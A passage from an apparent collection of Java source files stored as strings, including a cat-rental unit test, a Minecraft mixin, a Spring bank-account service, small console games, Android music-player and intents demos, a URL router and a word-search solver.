<pre>\n\t * Preconditions: c has been created with ID 1, and name \"Jennyanydots\".\n\t * Execution steps: Call c.rentCat().\n\t *                  Call c.getRented().\n\t * Postconditions: Return value of c.getRented() is true.\n\t * </pre>\n\t */\n\t@Test\n\tpublic void testRentCat() {\n\t\tc.rentCat();\n\t\tassertTrue(c.getRented());\n\t}\n\n\t/**\n\t * Test case for int returnCat().\n\t * \n\t * <pre>\n\t * Preconditions: c has been created with ID 1, and name \"Jennyanydots\".\n\t *                c has been rented.\n\t * Execution steps: Call c.returnCat().\n\t *                  Call c.getRented().\n\t * Postconditions: Return value of c.getRented() is false.\n\t * </pre>\n\t */\n\t@Test\n\tpublic void testReturnCat() {\n\t\tc.returnCat();\n\t\tassertFalse(c.getRented());\n\t}\n\n\t/**\n\t * Test case for int renameCat().\n\t * \n\t * <pre>\n\t * Preconditions: c has been created with ID 1, and name \"Jennyanydots\".\n\t * Execution steps: Call c.renameCat(\"Garfield\").\n\t * Postconditions: Return value of c.getName() is \"Garfield\".\n\t *                 Return value of c.toString() is \"ID 1. Garfield\".\n\t * </pre>\n\t */\n\t@Test\n\tpublic void testRenameCat() {\n\t\tc.renameCat(\"Garfield\");\n\t\tassertEquals(\"Garfield\", c.getName());\n\t\tassertEquals(\"ID 1. Garfield\", c.toString());\n\t}\n\n}\n",
    "package barch.tsm.mixin;\n\n\nimport net.minecraft.entity.EntityType;\nimport net.minecraft.entity.attribute.DefaultAttributeContainer;\nimport net.minecraft.entity.attribute.EntityAttributes;\nimport net.minecraft.entity.mob.MobEntity;\nimport net.minecraft.entity.passive.AnimalEntity;\nimport net.minecraft.entity.passive.CowEntity;\nimport net.minecraft.world.World;\nimport org.spongepowered.asm.mixin.Mixin;\nimport org.spongepowered.asm.mixin.injection.At;\nimport org.spongepowered.asm.mixin.injection.Inject;\nimport org.spongepowered.asm.mixin.injection.callback.CallbackInfoReturnable;\n\n@Mixin(CowEntity.class)\npublic abstract class CowEntityMixin extends AnimalEntity {\n\n\n    protected CowEntityMixin(EntityType<? extends AnimalEntity> entityType, World world) {\n        super(entityType, world);\n    }\n\n    @Inject(method = \"createCowAttributes\", at = @At(\"RETURN\"), cancellable = true)\n    private static void injected(CallbackInfoReturnable<DefaultAttributeContainer.Builder> cir) {\n        cir.setReturnValue(MobEntity.createMobAttributes()\n                .add(EntityAttributes.GENERIC_MAX_HEALTH, 20)\n                .add(EntityAttributes.GENERIC_MOVEMENT_SPEED, 0.2)\n                .add(EntityAttributes.GENERIC_ARMOR, 10)\n                .add(EntityAttributes.GENERIC_ARMOR_TOUGHNESS, 10));\n    }\n}\n",
    "package com.hateo.service;\n\nimport com.hateo.customException.CustomException;\nimport com.hateo.entity.Account;\nimport com.hateo.repository.AccountRepo;\nimport org.springframework.http.HttpStatus;\nimport org.springframework.http.ResponseEntity;\nimport org.springframework.stereotype.Component;\n\nimport java.util.List;\nimport java.util.Optional;\n@Component\npublic class AccountServiceImpl implements AccountService{\n\n    private final AccountRepo accountRepo;\n\n    public AccountServiceImpl(AccountRepo accountRepo) {\n        this.accountRepo = accountRepo;\n    }\n\n    //Add an Account\n    public Account addAccount(Account account){\n         return accountRepo.save(account);\n    }\n    //Get All Account details\n    public List<Account> getAllAccounts(){\n        System.out.println(\"Getting all Account Details\");\n        return accountRepo.findAll();\n\n    }\n    //get Single Account by id\n    public ResponseEntity<?> getSingleAccount(int id){\n        Optional<Account> byId = accountRepo.findById(id);\n        if (byId.isEmpty()){\n            return new ResponseEntity<>(\"Invalid Id\", HttpStatus.NOT_FOUND);\n        }\n        else {\n            return new ResponseEntity<>(byId.get(),HttpStatus.OK);\n        }\n    }\n    //Deposit into Account Balance\n    public ResponseEntity<?>deposit(int id,double balance){\n        Optional<Account> byId = accountRepo.findById(id);\n        if (byId.isEmpty()){\n            return new ResponseEntity<>(\"Invalid Id\",HttpStatus.NOT_FOUND);\n        }\n        else {\n            Account account = byId.get();\n            double currentBal=account.getBalance();\n            double updatedBalance=currentBal+balance;\n            account.setBalance(updatedBalance);\n            System.out.println(\"Depositing\");\n            return new ResponseEntity<>(accountRepo.save(account),HttpStatus.OK);\n        }\n    }\n    //Withdrawal from an Account\n    public ResponseEntity<?> withdrawal(int id,double bal){\n        Optional<Account> byId = accountRepo.findById(id);\n        if (byId.isEmpty()){\n            return new ResponseEntity<>(\"Invalid Id\",HttpStatus.NOT_FOUND);\n        }\n        else {\n            Account account = byId.get();\n            //Checking if withdrawal balance is greater than the total balance available\n            if (bal>account.getBalance()){\n              throw new CustomException(\"Low Balance\");\n            }\n            double currentBal=account.getBalance();\n            double updatedBalance=currentBal-bal;\n            account.setBalance(updatedBalance);\n            System.out.println(\"withdrawal\");\n            return new ResponseEntity<>(accountRepo.save(account),HttpStatus.OK);\n        }\n    }\n    //Delete a Specific Account\n    public ResponseEntity<?> deleteAccount(int id){\n        Optional<Account> byId = accountRepo.findById(id);\n        if (byId.isEmpty()){\n            return new ResponseEntity<>(\"Account Does not Exists !!\",HttpStatus.NOT_FOUND);\n        }\n        else {\n            accountRepo.deleteById(id);\n            return new ResponseEntity<>(\"Account information's deleted!!\",HttpStatus.OK);\n\n        }\n    }\n}\n",
    "import java.util.Scanner;\r\nimport notepad.Notepad;\r\n\r\npublic class App {\r\n    public static void main(String[] args) throws Exception {\r\n        Scanner scn = new Scanner(System.in);\r\n        Notepad notepad = new Notepad(100);\r\n\r\n\r\n        do {\r\n            System.out.println(\"Choose your option\");\r\n            System.out.println(\"1. Display the text\");\r\n            System.out.println(\"2. Display the text from given lines\");\r\n            System.out.println(\"3. Insert the text\");\r\n            System.out.println(\"4. Delete the text\");\r\n            System.out.println(\"5. Delete from given lines\");\r\n            System.out.println(\"6. Copy the text\");\r\n            System.out.println(\"7. Paste the text\");\r\n            System.out.println(\"8. Undo your action\");\r\n            System.out.println(\"9. Redo your action\");\r\n            System.out.println(\"10. Exit\");\r\n\r\n\r\n            System.out.println(\"Enter the choice:\");\r\n            int choice = scn.nextInt();\r\n            int lineNumber, startLine, endLine;\r\n\r\n            switch(choice) {\r\n                case 1: \r\n                    notepad.display();\r\n                    break;\r\n                case 2:    \r\n                    System.out.println(\"Enter the starting line and ending line value: \");\r\n                    startLine = scn.nextInt();\r\n                    endLine = scn.nextInt();\r\n                    notepad.display(startLine, endLine); \r\n                    break;\r\n                case 3:\r\n                    System.out.println(\"Enter the text: \");\r\n                    String text = scn.next();\r\n                    System.out.println(\"Enter the line number: \");\r\n                    lineNumber = scn.nextInt();\r\n                    notepad.insertLine(lineNumber, text);\r\n                    break;\r\n                case 4: \r\n                    System.out.println(\"Enter the line number: \");\r\n                    lineNumber = scn.nextInt();\r\n                    notepad.delete(lineNumber);\r\n                    break;\r\n                case 5: \r\n                    System.out.println(\"Enter the starting line and ending line value: \");\r\n                    startLine = scn.nextInt();\r\n                    endLine = scn.nextInt();\r\n                    notepad.delete(startLine, endLine);\r\n                    break;\r\n                case 6:\r\n                    System.out.println(\"Enter the starting line and ending line value: \");\r\n                    startLine = scn.nextInt();\r\n                    endLine = scn.nextInt();\r\n                    notepad.copy(startLine, endLine);\r\n                    break;\r\n                case 7:\r\n                    System.out.println(\"Enter the line number: \");\r\n                    lineNumber = scn.nextInt();\r\n                    notepad.paste(lineNumber);\r\n                    break;\r\n                case 8:\r\n                    notepad.undo();\r\n                    break;\r\n                case 9:\r\n                    notepad.redo();\r\n                    break;\r\n                case 10:\r\n                    System.exit(0);\r\n                    break;\r\n                default:\r\n                    System.out.println(\"Invalid choice\");\r\n\r\n            }\r\n        }while(true);\r\n    }\r\n}\r\n",
    "package com.ahmet.muzikoynatici;\n\nimport androidx.appcompat.app.AppCompatActivity;\n\nimport android.annotation.SuppressLint;\nimport android.media.MediaPlayer;\nimport android.os.Bundle;\nimport android.os.Handler;\nimport android.os.Message;\nimport android.view.View;\nimport android.widget.ImageView;\nimport android.widget.SeekBar;\nimport android.widget.TextView;\n\nimport java.io.File;\nimport java.util.ArrayList;\n\npublic class MainActivity extends AppCompatActivity {\n\n    ImageView play, next, prev;\n    TextView songName;\n    SeekBar seekBar;\n    MediaPlayer mediaPlayer;\n\n    Runnable runnable;\n    int index = 0;\n\n\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_main);\n\n        play = findViewById(R.id.imgPlay);\n        next = findViewById(R.id.imgNext);\n        prev = findViewById(R.id.imgPrev);\n        songName = findViewById(R.id.txtSong);\n        seekBar = findViewById(R.id.seekBar);\n\n        ArrayList<Integer> songs = new ArrayList<>();\n\n        songs.add(0, R.raw.ali_babanin_ciftligi);\n        songs.add(1, R.raw.arkadasim_essek);\n        songs.add(2, R.raw.ayi);\n        songs.add(3, R.raw.tatli_domatesler);\n        songs.add(4, R.raw.gunaydin_cocuklar);\n        songs.add(5, R.raw.karpuz_adam);\n        songs.add(6, R.raw.kirmizi_balik);\n        songs.add(7, R.raw.mini_mini_bir_kus);\n\n\n        mediaPlayer = MediaPlayer.create(getApplicationContext(), songs.get(index));\n\n\n        play.setOnClickListener(new View.OnClickListener() {\n                @Override\n                public void onClick(View view) {\n                    seekBar.setMax(mediaPlayer.getDuration());\n                    if (mediaPlayer != null && mediaPlayer.isPlaying()) {\n                        mediaPlayer.pause();\n                        play.setImageResource(R.drawable.ic_play);\n                    } else {\n                        mediaPlayer.start();\n                        play.setImageResource(R.drawable.ic_pause);\n                    }\n                    setSongName();\n                }\n            });\n\n        next.setOnClickListener(new View.OnClickListener() {\n            @Override\n            public void onClick(View view) {\n                if (mediaPlayer != null){\n                    play.setImageResource(R.drawable.ic_pause);\n                }\n                if (index<songs.size()-1){\n                    index++;\n                }else {\n                    index=0;\n                }\n                if (mediaPlayer.isPlaying()){\n                    mediaPlayer.stop();\n                }\n\n                mediaPlayer = mediaPlayer.create(getApplicationContext(),songs.get(index));\n                mediaPlayer.start();\n                setSongName();\n            }\n        });\n\n        prev.setOnClickListener(new View.OnClickListener() {\n            @Override\n            public void onClick(View view) {\n                if (mediaPlayer != null){\n                    play.setImageResource(R.drawable.ic_pause);\n                }\n                if (index>0){\n                    index--;\n                }else {\n                    index=songs.size() -1;\n                }\n                if (mediaPlayer.isPlaying()){\n                    mediaPlayer.stop();\n                }\n\n                mediaPlayer = mediaPlayer.create(getApplicationContext(),songs.get(index));\n                mediaPlayer.start();\n                setSongName();\n            }\n        });\n\n\n        }\n\n        private void setSongName(){\n            if (index == 0) {\n                songName.setText(\"Ali Baban\u0131n \u00c7iftli\u011fi\");\n            }\n            if (index == 1) {\n                songName.setText(\"Arkada\u015f\u0131m E\u015f\u015fek\");\n            }\n            if (index == 2) {\n                songName.setText(\"Ay\u0131\");\n            }\n            if (index == 3) {\n                songName.setText(\"Tatl\u0131 Domatesler\");\n            }\n            if (index == 4) {\n                songName.setText(\"G\u00fcnayd\u0131n \u00c7ocuklar\");\n            }\n            if (index == 5) {\n                songName.setText(\"Karpuz Adam\");\n            }\n            if (index == 6) {\n                songName.setText(\"K\u0131rm\u0131z\u0131 Bal\u0131k\");\n            }\n            if (index == 7) {\n                songName.setText(\"Mini Mini Bir Ku\u015f\");\n            }\n\n        mediaPlayer.setOnPreparedListener(new MediaPlayer.OnPreparedListener() {\n            @Override\n            public void onPrepared(MediaPlayer mediaPlayer) {\n                seekBar.setMax(mediaPlayer.getDuration());\n                mediaPlayer.start();\n            }\n        });\n        seekBar.setOnSeekBarChangeListener(new SeekBar.OnSeekBarChangeListener() {\n            @Override\n            public void onProgressChanged(SeekBar seekBar, int i, boolean b) {\n                if (b){\n                    mediaPlayer.seekTo(i);\n                    seekBar.setProgress(i);\n                }\n            }\n\n            @Override\n            public void onStartTrackingTouch(SeekBar ",
    "package welcome.utils;\nimport java.lang.reflect.InvocationTargetException;\nimport java.util.logging.Level;\nimport java.util.logging.Logger;\nimport welcome.*;\nimport welcome.ia.*;\n\npublic abstract class Tournoi {\n\n    Joueur[] participants;\n    \n    public Tournoi(int[] _strats) throws NoSuchMethodException{\n        this.participants=new Joueur[_strats.length];\n        for(int i=0; i<_strats.length; i++){\n            try{\n                Class classe = Class.forName(\"welcome.ia.Strat\" + _strats[i]);\n                Strat s = (Strat)classe.getDeclaredConstructor().newInstance();\n                participants[i]=new Bot(s, s.nomJoueur(), s.nomVille());\n                participants[i].setVerbose(false);\n            }\n            catch(ClassNotFoundException e){\n                e.printStackTrace();\n            } catch (InstantiationException ex) {\n                Logger.getLogger(Tournoi.class.getName()).log(Level.SEVERE, null, ex);\n            } catch (IllegalAccessException ex) {\n                Logger.getLogger(Tournoi.class.getName()).log(Level.SEVERE, null, ex);\n            } catch (IllegalArgumentException ex) {\n                Logger.getLogger(Tournoi.class.getName()).log(Level.SEVERE, null, ex);\n            } catch (InvocationTargetException ex) {\n                Logger.getLogger(Tournoi.class.getName()).log(Level.SEVERE, null, ex);\n            }\n        }\n    }\n    \n    \n    public abstract int[][] run();\n}\n",
    "package game;\n\nimport cards.Card;\nimport hand.Hand;\nimport javafx.geometry.Pos;\nimport javafx.scene.image.Image;\nimport javafx.scene.image.ImageView;\nimport javafx.scene.layout.HBox;\nimport javafx.scene.layout.Pane;\nimport player.Player;\n\npublic class DealerArea extends HBox{\n\n    //Who does the dealer area belong to?\n    private Player dealer;\n\n    //The 3 cards holders (using a pane so we can style it\n    private HBox cardBack;  //To mimic a deck face down\n    private HBox discardHolder; //To mimic the discard pile\n\n    //For Tioli only\n    private HBox tioliHolder; //To show the card to decide on\n\n    //Image views\n    private ImageView cardBackView;\n    private ImageView discardHolderView;\n\n    //For Tioli\n    private ImageView tioliHolderView;\n\n    //To track if Tioli\n    private boolean tioli = false;\n\n    public DealerArea(Player dealer, String gameType) {\n        //Note which player owns this object\n        this.dealer = dealer;\n\n        tioli = (gameType == \"tioli\") ? true : false;\n        buildArea();\n    }\n\n    private void buildArea() {\n        //Create the display for the face down deck\n        createCardBackArea();\n\n        //Create the TIOLI holder\n        if(tioli) createTioliHolder();\n\n        //Create the discard pile\n        createDiscardHolder();\n\n        //Now add them all the the HBox (using 'this')\n        if(tioli) {\n            this.getChildren().addAll(cardBack, tioliHolder, discardHolder);\n        } else {\n            this.getChildren().addAll(cardBack, discardHolder);\n        }\n\n\n    }\n\n    private void createCardBackArea() {\n        //Instantiate the HBox\n        cardBack = new HBox();\n\n        //Instantiate the ImageView\n        cardBackView = new ImageView();\n\n        //AddView to HBox\n        cardBack.getChildren().add(cardBackView);\n\n        //Now add an image to the pane\n        setCardBack(\"red\");\n\n        //Style HBox which holds our face down deck\n        cardBack.setAlignment(Pos.CENTER);\n\n        //Use some CSS to style the HBox\n        styleCardHolders(cardBack);\n\n\n    }\n\n    private void createDiscardHolder() {\n        //Instantiate the HBox\n        discardHolder = new HBox();\n\n        //Instantiate the ImageView\n        discardHolderView = new ImageView();\n\n        //Add view to HBox\n        discardHolder.getChildren().add(discardHolderView);\n\n        //Style HBox which holds our face down deck\n        discardHolder.setAlignment(Pos.CENTER);\n\n        //Use some CSS to style the HBox\n        styleCardHolders(discardHolder);\n\n    }\n\n    private void createTioliHolder() {\n        //Instantiate the HBox\n        tioliHolder = new HBox();\n\n        tioliHolderView = new ImageView();\n        //Style HBox which holds our face down deck\n        tioliHolder.setAlignment(Pos.CENTER);\n\n        //Use some CSS to style the HBox\n        styleCardHolders(tioliHolder);\n\n    }\n\n\n    private void styleCardHolders(Pane paneToStyle) {\n        String cssLayout =\n                \"-fx-border-color: black;\\n\" +\n                        \"-fx-border-insets: 5;\\n\" +\n                        \"-fx-border-width: 2;\\n\" +\n                        \"-fx-border-style: solid;\\n\";\n\n        paneToStyle.setStyle(cssLayout);\n        paneToStyle.setPrefWidth(100);\n        paneToStyle.setPrefHeight(120);\n        paneToStyle.setMinHeight(USE_PREF_SIZE);\n        paneToStyle.setMinWidth(USE_PREF_SIZE);\n    }\n\n    //Add the card back image to the the pane\n    public void setCardBack(String color) {\n\n        //Add the card image to the cardBackView object\n        String imageURL = \"file:images/card/\" + color + \".png\";\n        cardBackView.setImage(new Image(imageURL));\n    }\n\n    protected void showDiscardedCard(Card card) {\n\n        //Get the card image URL\n        String cardImageURL =  \"file:images/card/\" + card.getCardImage();\n\n        //Display the card image\n        discardHolderView.setImage(new Image(cardImageURL));\n    }\n\n\n    //Add the Tioli card image to the pane\n    protected void showTioliCard() {\n\n        //Get the image URL from the dealer's hand\n        Hand dealerHand = dealer.getHand();\n        Card[] dealerCard = dealerHand.getCards();  //To use to get the image url\n        String imageURL; //To hold the image url\n\n        //The dealer hand only has 1 card\n        imageURL =  \"file:images/card/\" + dealerCard[0].getCardImage(); //Get the cardImage value from the card object\n\n        //Put the image in the TioliHolder\n        tioliHolderView.setImage(new Image(imageURL));\n    }\n\n    //Assignment 3.2\n    protected void removeTioliImage() {\n        tioliHolderView.setImage(null);\n    }\n\n    //Assignment 3.2\n    protected void removeDiscardImage() {\n        discardHolderView.setImage(null);\n    }\n\n}\n",
    "import java.util.Random;\r\nimport java.util.Scanner;\r\n\r\npublic class NumberGuessingGame {\r\n    public static void main(String[] args) {\r\n        Scanner scanner = new Scanner(System.in);\r\n        Random random = new Random();\r\n        int minRange = 1;\r\n        int maxRange = 100;\r\n        int attemptsLimit = 5;\r\n        int score = 0;\r\n        boolean playAgain = true;\r\n\r\n        System.out.println(\"Welcome to the Number Guessing Game!\");\r\n\r\n        while (playAgain) {\r\n            int randomNumber = random.nextInt(maxRange - minRange + 1) + minRange;\r\n            System.out.println(\"I have generated a number between \" + minRange + \" and \" + maxRange + \". Guess the number!\");\r\n            int attempts = 0;\r\n            boolean guessedCorrectly = false;\r\n\r\n            while (attempts < attemptsLimit && !guessedCorrectly) {\r\n                System.out.print(\"Enter your guess: \");\r\n                int userGuess = scanner.nextInt();\r\n                attempts++;\r\n\r\n                if (userGuess == randomNumber) {\r\n                    System.out.println(\"Congratulations! You guessed the correct number in \" + attempts + \" attempts.\");\r\n                    score++;\r\n                    guessedCorrectly = true;\r\n                } else if (userGuess < randomNumber) {\r\n                    System.out.println(\"Too low! Try again.\");\r\n                } else {\r\n                    System.out.println(\"Too high! Try again.\");\r\n                }\r\n            }\r\n\r\n            if (!guessedCorrectly) {\r\n                System.out.println(\"Sorry, you have reached the maximum number of attempts. The correct number was: \" + randomNumber);\r\n            }\r\n\r\n            System.out.println(\"Your current score is: \" + score);\r\n            System.out.print(\"Do you want to play again? (yes/no): \");\r\n            String playAgainResponse = scanner.next().toLowerCase();\r\n            playAgain = playAgainResponse.equals(\"yes\") || playAgainResponse.equals(\"y\");\r\n        }\r\n        System.out.println(\"Thank you for playing!\");\r\n        scanner.close();\r\n    }\r\n}\r\n",
    "package route;\n\nimport java.util.ArrayList;\nimport java.util.concurrent.ConcurrentHashMap;\nimport java.util.concurrent.ConcurrentMap;\n\n/**\n * URL\u8def\u7531\u5668\uff0c\u7528\u4e8e\u6ce8\u518cURL\u8def\u7531\u548c\u5339\u914dURL\u8def\u7531\u3002\n *\n * @author wangyongshan\n */\npublic class Router {\n    public static final String HTTP_METHOD_GET = \"GET\";\n    public static final String HTTP_METHOD_POST = \"POST\";\n    public static final String HTTP_METHOD_PUT = \"PUT\";\n    public static final String HTTP_METHOD_DELETE = \"DELETE\";\n    public static final String HTTP_METHOD_HEAD = \"HEAD\";\n    public static final String HTTP_METHOD_OPTIONS = \"OPTIONS\";\n    public static final String HTTP_METHOD_PATCH = \"PATCH\";\n    public static final String HTTP_METHOD_TRACE = \"TRACE\";\n    public static final String HTTP_METHOD_CONNECT = \"CONNECT\";\n\n    private static final String[] ANY_HTTP_METHODS = {\n        HTTP_METHOD_GET, HTTP_METHOD_POST,\n        HTTP_METHOD_PUT, HTTP_METHOD_DELETE,\n        HTTP_METHOD_HEAD, HTTP_METHOD_OPTIONS,\n        HTTP_METHOD_PATCH, HTTP_METHOD_TRACE,\n        HTTP_METHOD_CONNECT\n    };\n\n    private ConcurrentMap<String, RouteNode> routesMap = new ConcurrentHashMap<>();\n\n    /**\n     * \u6ce8\u518c\u8def\u7531\n     * @param httpMethod HTTP method\n     * @param routePath \u6ce8\u518c\u7684\u8def\u7531\u8def\u5f84\uff08\u652f\u6301\u53d8\u91cf</a/:var1>\u548c\u901a\u914d\u7b26</a/*action>\uff09\n     * @param handlers \u8def\u7531\u5904\u7406\u7a0b\u5e8f\n     */\n    public Router addRoute(String httpMethod, String routePath, HandlersChain handlers) {\n        if (httpMethod == null || httpMethod.isEmpty()) {\n            throw new RouteSyntaxException(\"HTTP method can not be empty\");\n        }\n\n        if (routePath == null || routePath.isEmpty()) {\n            throw new RouteSyntaxException(\"Route path can not be empty\");\n        }\n\n        if (routePath.charAt(0) != '/') {\n            throw new RouteSyntaxException(\"Route path must begin with '/'\");\n        }\n\n        RouteNode root = routesMap.get(httpMethod);\n        if (root == null) {\n            root = routesMap.computeIfAbsent(httpMethod, (String method) -> {\n                RouteNode rootNode = new RouteNode();\n                rootNode.setFullPath(\"/\");\n                return rootNode;\n            });\n        }\n\n        root.addRoute(routePath, handlers);\n\n        return this;\n    }\n\n    public Router get(String routePath, HandlersChain handlers) {\n        return this.addRoute(HTTP_METHOD_GET, routePath, handlers);\n    }\n\n    public Router post(String routePath, HandlersChain handlers) {\n        return this.addRoute(HTTP_METHOD_POST, routePath, handlers);\n    }\n\n    public Router put(String routePath, HandlersChain handlers) {\n        return this.addRoute(HTTP_METHOD_PUT, routePath, handlers);\n    }\n\n    public Router delete(String routePath, HandlersChain handlers) {\n        return this.addRoute(HTTP_METHOD_DELETE, routePath, handlers);\n    }\n\n    public Router options(String routePath, HandlersChain handlers) {\n        return this.addRoute(HTTP_METHOD_OPTIONS, routePath, handlers);\n    }\n\n    public Router head(String routePath, HandlersChain handlers) {\n        return this.addRoute(HTTP_METHOD_HEAD, routePath, handlers);\n    }\n\n    public Router patch(String routePath, HandlersChain handlers) {\n        return this.addRoute(HTTP_METHOD_PATCH, routePath, handlers);\n    }\n\n    public Router any(String routePath, HandlersChain handlers) {\n        for (String method : ANY_HTTP_METHODS) {\n            this.addRoute(method, routePath, handlers);\n        }\n        return this;\n    }\n\n    public RouteInfo match(String httpMethod, String requestUrl) {\n        if (httpMethod == null || httpMethod.isEmpty()) {\n            throw new RouteSyntaxException(\"HTTP method can not be empty\");\n        }\n\n        if (requestUrl == null || requestUrl.isEmpty()) {\n            throw new RouteSyntaxException(\"Request url can not be empty\");\n        }\n\n        RouteNode root = routesMap.get(httpMethod);\n        if (root == null) {\n            return null;\n        }\n\n        RouteInfo routeInfo = root.getValue(requestUrl, new Params(), new ArrayList<>(), false);\n        if (routeInfo.isTsr() || routeInfo.handlers == null) {\n            return null;\n        }\n\n        routeInfo.method = httpMethod;\n        return routeInfo;\n    }\n\n}\n",
    "public class WordSearch79 {\r\n    class Solution {\r\n        public boolean exist(char[][] board, String word) {\r\n            path = \"\";\r\n            for (int i = 0;i < board.length;i++)\r\n            {\r\n                for (int j = 0;j < board[i].length;j++)\r\n                {\r\n                    if (board[i][j]==word.charAt(0)) {\r\n                        vis = new boolean[board.length][board[0].length];\r\n                        if (backtrack(i, j, board.length, board[0].length, board, word, 0))\r\n                            return true;\r\n                    }\r\n                }\r\n            }\r\n            return false;\r\n        }\r\n        String path;\r\n        boolean[][] vis;\r\n        boolean backtrack(int i,int j,int n,int m,char[][] board,String word,int idx)\r\n        {\r\n\r\n            if (path.length()==word.length())\r\n                return path.equals(word);\r\n            if(isValid(i,j,n,m)||vis[i][j])\r\n                return false;\r\n\r\n            if (board[i][j]!=word.charAt(idx))\r\n                return false;\r\n            path+=board[i][j];\r\n            vis[i][j] = true;\r\n            boolean d0 = backtrack(i+1,j,n,m,board,word,idx+1);\r\n            boolean d1 = backtrack(i-1,j,n,m,board,word,idx+1);\r\n            boolean d2 = backtrack(i,j+1,n,m,board,word,idx+1);\r\n            boolean d3 = backtrack(i,j-1,n,m,board,word,idx+1);\r\n            vis[i][j] = false;\r\n            path=path.substring(0,path.length()-1);\r\n\r\n            return d0 | d1 | d2 | d3;\r\n        }\r\n        boolean isValid(int i,int j,int n,int m){\r\n            return i<0||i>=n||j<0||j>=m;\r\n        }\r\n\r\n    }\r\n}\r\n\r\n",
    "package es.master.intentsmultiusos;\n\nimport android.content.Intent;\nimport android.database.Cursor;\nimport android.net.Uri;\nimport android.os.Bundle;\nimport android.provider.ContactsContract;\nimport android.provider.MediaStore;\nimport android.view.View;\n\nimport androidx.activity.EdgeToEdge;\nimport androidx.activity.result.ActivityResultLauncher;\nimport androidx.activity.result.contract.ActivityResultContracts;\nimport androidx.appcompat.app.AppCompatActivity;\nimport androidx.core.graphics.Insets;\nimport androidx.core.view.ViewCompat;\nimport androidx.core.view.WindowInsetsCompat;\n\nimport es.master.intentsmultiusos.databinding.ActivityMainBinding;\n\npublic class MainActivity extends AppCompatActivity {\n\n    ActivityMainBinding binding;\n\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        binding = ActivityMainBinding.inflate(getLayoutInflater());\n        setContentView(binding.getRoot());\n\n        binding.btnEnviar.setOnClickListener(view -> {\n            Intent intent = new Intent(this, HomeActivity.class);\n            activityResultLauncher.launch(intent);\n        });\n\n        binding.btnEnviarMail.setOnClickListener(view -> {\n            construccionEmail();\n        });\n\n        binding.btnLlamarTlf.setOnClickListener(view -> {\n            String num = binding.etTlf.getText().toString();\n            if (!num.isEmpty()) {\n                Intent llamadaIntent = new Intent(Intent.ACTION_DIAL);\n                llamadaIntent.setData(android.net.Uri.parse(\"tel:\" + num));\n                startActivity(llamadaIntent);\n            }\n        });\n\n        binding.btnNavegador.setOnClickListener(view -> {\n            Intent webIntent = new Intent(Intent.ACTION_VIEW);\n            webIntent.setData(android.net.Uri.parse(\"http://www.google.es\"));\n            startActivity(webIntent);\n        });\n\n        binding.btnMaps.setOnClickListener(view -> {\n            Intent abrirMaps = new Intent(Intent.ACTION_VIEW);\n            abrirMaps.setData(android.net.Uri.parse(\"geo:\" + 41.39 + \",\" + 4.44 + \"?q=Valladolid\"));\n            startActivity(abrirMaps);\n        });\n\n        binding.btnRecuperarContacto.setOnClickListener(view -> {\n            /*\n            Intent recuperarContacto = new Intent(Intent.ACTION_PICK, ContactsContract.Contacts.CONTENT_URI);\n            activityResultLauncherContacts.launch(recuperarContacto);\n            */\n        });\n\n        binding.btnCamara.setOnClickListener(view -> {\n            Intent camara = new Intent(MediaStore.ACTION_IMAGE_CAPTURE);\n            activityResultLauncherCamara.launch(camara);\n        });\n\n    }\n\n    private void construccionEmail() {\n        //Mediante este intent enviamos un correo electr\u00f3nico.\n        Intent emailIntent = new Intent(Intent.ACTION_SEND);\n        emailIntent.setType(\"plain/text\");\n\n        //A\u00f1ado el destinatario al que se env\u00eda el email.\n        emailIntent.putExtra(Intent.EXTRA_EMAIL, new String[]{\"a@b.com\"});\n\n        //A\u00f1ado el destinatario en copia al que se env\u00eda.\n        emailIntent.putExtra(Intent.EXTRA_CC, new String[]{\"b@b.com\"});\n\n        //A\u00f1ado el asunto para el mail.\n        emailIntent.putExtra(Intent.EXTRA_SUBJECT, new String[]{});\n\n        //A\u00f1ado el cuerpo del texto del email.\n        emailIntent.putExtra(Intent.EXTRA_TEXT, \"\");\n\n        //Le deja al usuario elegir la aplicacion de email.\n        startActivity(Intent.createChooser(emailIntent, \"Elige la aplicacion.\"));\n    }\n\n    ActivityResultLauncher<Intent> activityResultLauncher = registerForActivityResult(\n            new ActivityResultContracts.StartActivityForResult(), result -> {\n\n                if (result.getResultCode() == RESULT_OK) {\n                    Intent data = result.getData();\n                    String datos = null;\n\n                    if (data != null) {\n                        datos = data.getStringExtra(\"datos\");\n                    }\n                    binding.txtMostrar.setText(datos);\n                }\n            }\n    );\n\n    ActivityResultLauncher<Intent> activityResultLauncherCamara = registerForActivityResult(\n            new ActivityResultContracts.StartActivityForResult(), result -> {\n\n                if (result.getResultCode() == RESULT_OK) {\n                    Intent data = result.getData();\n\n                    if (data != null) {\n                        //binding.iv_camara.setImageURI(data.getData());\n                    }\n                }\n            }\n    );\n\n    /*\n    Codigo para obtener la informacion del contacto seleccionado.\n    ActivityResultLauncher<Intent> activityResultLauncherContacts = registerForActivityResult(\n            new ActivityResultContracts.StartActivityForResult(), result2 -> {\n                if (result2.getResultCode() == RESULT_OK) {\n                    Uri uri = result2.getData().getData(); // Retrieve data from the result Intent\n                    String[] datosTlf = new String[]{ContactsContract.CommonDataKinds.Phone.NUMBER};\n                    ",
    "package org.example.entity;\n\n\npublic class User {\n\n    private Long id;\n    private String name;\n    private String lastName;\n    private Byte age;\n\n    public User() {\n    }\n\n    public User(Long id, String name, String lastName, Byte age) {\n        this.id = id;\n        this.name = name;\n        this.lastName = lastName;\n        this.age = age;\n    }\n\n    public Long getId() {\n        return id;\n    }\n\n    public void setId(Long id) {\n        this.id = id;\n    }\n\n    public String getName() {\n        return name;\n    }\n\n    public void setName(String name) {\n        this.name = name;\n    }\n\n    public String getLastName() {\n        return lastName;\n    }\n\n    public void setLastName(String lastName) {\n        this.lastName = lastName;\n    }\n\n    public Byte getAge() {\n        return age;\n    }\n\n    public void setAge(Byte age) {\n        this.age = age;\n    }\n\n    @Override\n    public String toString() {\n        return \"User{\" +\n                \"id=\" + id +\n                \", name='\" + name + '\\'' +\n                \", lastName='\" + lastName + '\\'' +\n                \", age=\" + age +\n                '}';\n    }\n}\n",
